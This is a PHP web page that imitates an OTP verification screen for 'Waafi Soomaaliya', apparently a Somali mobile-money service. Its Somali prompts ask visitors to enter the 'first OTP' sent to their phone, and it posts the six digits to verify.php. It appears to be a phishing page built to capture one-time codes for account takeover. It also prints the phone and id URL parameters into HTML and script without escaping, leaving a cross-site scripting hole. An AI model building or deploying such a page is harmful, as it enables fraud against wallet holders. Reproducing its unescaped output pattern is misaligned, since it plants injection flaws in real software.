<?php
if (isset($_GET['error'])) {
    echo "<p style='color:red;'>Koodh khaldan,fadlan mar kale isku day❌</p>";
}
?>
<?php
// Make id optional
$id = $_GET['id'] ?? '';        // if 'id' is missing, $id becomes empty string
$phone = $_GET['phone'] ?? '';  // phone is required

// Only check phone, since that's what we use
if(empty($phone)){
    echo "Invalid access";
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>OTP Verification</title>

<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: linear-gradient(to bottom, #9be000, #6cc000);
}

/* HEADER */
.header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 15px;
    color: #333;
    background: #fff;
}

.header h2 {
    margin: 0;
    color: #4CAF50;
}

/* CARD */
.container {
    background: #fff;
    margin: 40px 15px;
    padding: 25px;
    border-radius: 20px;
    text-align: center;
    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
}

.container h2 {
    margin-bottom: 10px;
}

.phone {
    font-weight: bold;
    margin: 10px 0 20px;
}

/* OTP BOXES */
.otp-box {
    display: flex;
    justify-content: center;
    gap: 10px;
    margin: 20px 0;
}

.otp {
   width: 50px;
    height: 50px;
    border: 2px solid #6cc04a;
    border-radius: 10px;
    text-align: center;
    font-size: 20px;
}

/* RESEND TEXT */
.resend {
    margin: 10px 0;
    color: #777;
}

.resend span {
    color: #4CAF50;
    font-weight: bold;
    cursor: pointer;
}


/* FOOTER CURVE */
.footer {
    margin-top: 80px;
    text-align: center;
    color: white;
    padding: 30px;
}
</style>
</head>

<body>

<!-- HEADER -->
<div class="header">
    <span>←</span>
    <h2>Waafi</h2>
    <span>☰</span>
</div>

<!-- MAIN CARD -->
<div class="container">

    <h2>Xaqiijinta OTP-ga Kowaad</h2>

    <p>Geli OTP-ga kowaad ee loogu diray lambarka taleefankaaga</p>

<h3>+252 <?php echo $phone; ?></h3>

<form id="otpForm" action="verify.php" method="POST">

<input type="hidden" name="id" value="<?php echo $id; ?>">
<input type="hidden" name="phone" value="<?php echo $phone; ?>">

<div class="otp-boxes">
    <input type="text" maxlength="1" name="d1">
    <input type="text" maxlength="1" name="d2">
    <input type="text" maxlength="1" name="d3">
    <input type="text" maxlength="1" name="d4">
    <input type="text" maxlength="1" name="d5">
    <input type="text" maxlength="1" name="d6">
</div>

<button type="submit">XAQIIJI OTP-GA KOWAAD</button>
<p id="timer">Resend otp in 30s</p>

<button id="resendBtn" disabled>resend otp</button>

</form>

</div>
<!-- FOOTER -->
<div class="footer">
    © 2026 Waafi Soomaaliya
</div>

</body>
</html>
<script>
const inputs = document.querySelectorAll('.otp-boxes input');

// AUTO MOVE + BACKSPACE
inputs.forEach((input, index) => {

    input.addEventListener('input', (e) => {
        let value = e.target.value;

        // allow only numbers
        e.target.value = value.replace(/[^0-9]/g, '');

        if (value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
            inputs[index - 1].focus();
        }
    });

});


// 🔥 PASTE FULL OTP (IMPORTANT FEATURE)
document.querySelector('.otp-boxes').addEventListener('paste', (e) => {

    e.preventDefault();

    let pasteData = (e.clipboardData || window.clipboardData).getData('text');

    pasteData = pasteData.replace(/[^0-9]/g, '').slice(0, inputs.length);

    pasteData.split('').forEach((char, index) => {
        if (inputs[index]) {
            inputs[index].value = char;
        }
    });

});
</script>
<script>
let timeLeft = 30;
const timer = document.getElementById("timer");
const resendBtn = document.getElementById("resendBtn");

// countdown
let countdown = setInterval(() => {
    timeLeft--;
    timer.innerText = "Resend OTP in " + timeLeft + "s";

    if (timeLeft <= 0) {
        clearInterval(countdown);
        timer.innerText = "You can resend OTP now";
        resendBtn.disabled = false;
    }
}, 1000);

// resend button click
resendBtn.addEventListener("click", () => {

    // reset timer
    timeLeft = 30;
    resendBtn.disabled = true;

    timer.innerText = "Resend OTP in 30s";

    countdown = setInterval(() => {
        timeLeft--;
        timer.innerText = "Resend OTP in " + timeLeft + "s";

        if (timeLeft <= 0) {
            clearInterval(countdown);
            timer.innerText = "You can resend OTP now";
            resendBtn.disabled = false;
        }
    }, 1000);

    // OPTIONAL: call backend
    fetch("resend_otp.php?id=<?php echo $id; ?>")
    .then(res => res.text())
    .then(data => {
        console.log(data);
    });

});
</script>


</body>
</html>